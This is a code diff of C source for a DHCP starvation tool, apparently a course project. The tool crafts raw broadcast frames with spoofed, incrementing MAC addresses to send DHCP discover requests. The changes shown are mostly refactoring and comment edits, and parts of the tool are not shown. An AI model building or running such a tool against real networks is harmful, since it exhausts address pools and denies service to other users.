@@ -1,6 +1,6 @@
 #include "pds-dhcpstarve.h"
 
-void help() {
+void help(){
   printf("HELP\n");
 }
 
@@ -8,14 +8,14 @@ void help() {
 * Eror message wrapper
 */
 void err(string msg, int erno, short show_help){
-  perror( msg.c_str());
+  fprintf(stderr, "%s\n", msg.c_str());
   if (show_help) help();
   exit(erno);
 }
 
 /**
 * Universal function for memory allocation checking
-**/
+*/
 void check_null(void * lel){
   if (lel == NULL) err("Memory allocation failure", ERR, 0);
 }
@@ -47,21 +47,7 @@ void increment_mac_addr (uint8_t *addr ){
 }
 
 /**
-* Create in_addr* from string(char *) for ip header
-*/
-struct in_addr* str_to_ip(const char* addr){
-  struct in_addr* tmp_addr = (struct in_addr*) malloc(sizeof(struct in_addr));
-  check_null(tmp_addr);
-
-  int e;
-  if ((e = inet_pton(AF_INET, addr, tmp_addr)) != 1) {
-    err("inet_pton: Failed to convert ip adr", e, 0);
-  }
-  return tmp_addr;
-}
-
-/**
-* compute the checksum, inspired by rfc1071 and
+* Compute the checksum, inspired by rfc1071 and
 * https://www.thegeekstuff.com/2012/05/ip-header-checksum
 */
 void checksum(struct ip *hdr, int len){
@@ -84,7 +70,7 @@ void checksum(struct ip *hdr, int len){
 
 /**
 * Create, allocate and fill necessary values to ip header
-**/
+*/
 struct ip* get_ip_header(){
   struct ip* hdr = (struct ip*)malloc(sizeof(struct ip));
   check_null(hdr);
@@ -96,9 +82,10 @@ struct ip* get_ip_header(){
   hdr->ip_id = htons(9999); // random blob
   hdr->ip_ttl = 255;        // 255, why not it's an attack
   hdr->ip_p = IPPROTO_UDP;  // udp, RFC constant
-  hdr->ip_src = *str_to_ip(IP4_SRC_ADDR);        //Fill in ip addresses
-  hdr->ip_dst = *str_to_ip(IP4_BROADCAST);
   hdr->ip_len = htons(DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN);
+
+  inet_pton(AF_INET, IP4_SRC_ADDR, &hdr->ip_src); //Fill in ip addresses
+  inet_pton(AF_INET, IP4_BROADCAST, &hdr->ip_dst);
   checksum(hdr,IP4_HEADER_LEN);
   return hdr;
 }
@@ -155,7 +142,7 @@ void make_discover(unsigned char* buffer, unsigned char* src_mac_addr){
 
 int main(int argc, char** argv) {
   char* interface_name = checkArgs(argc, argv); // get name of the interface
-  srand(time(NULL));
+  srand(time(NULL));  // pseudo generate IP id and DHCP transaction xid
   int sd = 0;
   if ((sd = socket (PF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0) {
     err ("Failed to create socket", sd, 0);
@@ -163,8 +150,8 @@ int main(int argc, char** argv) {
   uint8_t src_mac_addr[MAC_ADDR_LEN];  // initiate src mac adress
   uint8_t dst_mac_addr[MAC_ADDR_LEN];  // set dst mac for broadcast
   for (size_t i = 0; i < MAC_ADDR_LEN; i++) {
-    dst_mac_addr[i] = MAX_OCTET_HEX;
-    src_mac_addr[i] = MIN_OCTET_HEX;
+    dst_mac_addr[i] = MAX_OCTET_HEX;  // fill with 0xff
+    src_mac_addr[i] = MIN_OCTET_HEX;  // fill with 0x00
   }
 
   struct sockaddr_ll interface;
@@ -179,7 +166,7 @@ int main(int argc, char** argv) {
   struct ip* ip_header = get_ip_header();
   struct udphdr* udp_header = get_udp_header();
 
-  unsigned char buffer[DHCP_BUFFER_SIZE];
+  unsigned char buffer[DHCP_BUFFER_SIZE]; // dhcp message buffer
 
   int eth_msg_len = DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN + ETH_HEADER_LEN;
   unsigned char* eth_frame = (unsigned char*)malloc(eth_msg_len);
@@ -188,7 +175,7 @@ int main(int argc, char** argv) {
   memcpy(eth_frame, dst_mac_addr, 6 * sizeof(uint8_t));
   eth_frame[12] = 0x08; // ETH_P_IP value
   eth_frame[13] = 0x00;
-  /* L2 ends here */
+  /* L2 ends here ^ Add IP (L3) and UDP (L4) headers next... */
   memcpy(eth_frame + ETH_HEADER_LEN, ip_header, IP4_HEADER_LEN * sizeof(uint8_t));
   memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN, udp_header, UDP_HEADER_LEN * sizeof(uint8_t));
 
@@ -214,7 +201,6 @@ int main(int argc, char** argv) {
     err("Failed to close the socket", sd, 0);
   }
   free(udp_header);
-  //TODO: 2 mem leaks
   free(ip_header);
   free(eth_frame);
 }
